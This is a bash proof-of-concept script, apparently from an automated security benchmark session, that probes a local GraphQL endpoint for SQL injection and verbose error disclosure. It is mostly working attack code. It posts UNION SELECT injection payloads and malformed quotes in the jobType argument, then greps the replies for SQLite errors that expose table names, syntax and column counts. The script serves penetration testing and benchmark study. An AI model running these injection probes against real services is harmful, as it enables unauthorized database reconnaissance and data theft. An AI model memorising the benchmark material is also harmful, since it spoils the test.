#!/bin/bash
# POC: Demonstrates information disclosure via verbose SQL error messages in GraphQL endpoint. Shows how detailed error messages reveal database structure, table names, and SQL syntax information.
# Target: ./repo
# Created: 2025-11-10T15:11:09.056Z
# Session: benchmark-XBEN-038-24-mht9rpjz

# SQL Error Information Disclosure POC
# This script demonstrates how verbose SQL error messages leak database structure information
# through the GraphQL endpoint

TARGET_URL="http://localhost:8000/graphql/"

echo "=== SQL Error Information Disclosure POC ==="
echo ""
echo "Testing GraphQL endpoint for verbose SQL error messages..."
echo "Target: $TARGET_URL"
echo ""

# Test 1: Non-existent table error message
echo "[Test 1] Attempting to query non-existent table to trigger error"
echo ""

# Create payload file to avoid quoting issues
cat > /tmp/payload1.json <<'EOF'
{"query": "{ jobs(jobType: \"x' UNION SELECT 1,2 FROM users--\") { id name type description } }"}
EOF

RESPONSE1=$(curl -s -X POST "$TARGET_URL" \
  -H 'Content-Type: application/json' \
  -d @/tmp/payload1.json)

echo "Response 1:"
echo "$RESPONSE1"
echo ""

# Extract error message for analysis
if echo "$RESPONSE1" | grep -q "no such table"; then
    echo "[✓] VULNERABILITY CONFIRMED: Error reveals non-existent table names"
    echo "    Database structure information leaked"
fi

echo ""
echo "[Test 2] Attempting empty string query to trigger syntax error"
echo ""

cat > /tmp/payload2.json <<'EOF'
{"query": "{ jobs(jobType: \"''\") { id name type description } }"}
EOF

RESPONSE2=$(curl -s -X POST "$TARGET_URL" \
  -H 'Content-Type: application/json' \
  -d @/tmp/payload2.json)

echo "Response 2:"
echo "$RESPONSE2"
echo ""

# Extract error message for analysis
if echo "$RESPONSE2" | grep -q "unrecognized token\|syntax error"; then
    echo "[✓] VULNERABILITY CONFIRMED: Error reveals SQL syntax structure"
fi

echo ""
echo "[Test 3] Testing column count error to enumerate columns"
echo ""

cat > /tmp/payload3.json <<'EOF'
{"query": "{ jobs(jobType: \"x' UNION SELECT 1,2,3 FROM jobs--\") { id name type description } }"}
EOF

RESPONSE3=$(curl -s -X POST "$TARGET_URL" \
  -H 'Content-Type: application/json' \
  -d @/tmp/payload3.json)

echo "Response 3:"
echo "$RESPONSE3"
echo ""

if echo "$RESPONSE3" | grep -q "mismatch\|SELECTs have different"; then
    echo "[✓] VULNERABILITY CONFIRMED: Error reveals column count"
fi

echo ""
echo "=== Summary ==="
echo "SQL error messages expose database structure information:"
echo "- Table enumeration"
echo "- SQL syntax details"
echo "- Column count information"
echo "- Database type (SQLite)"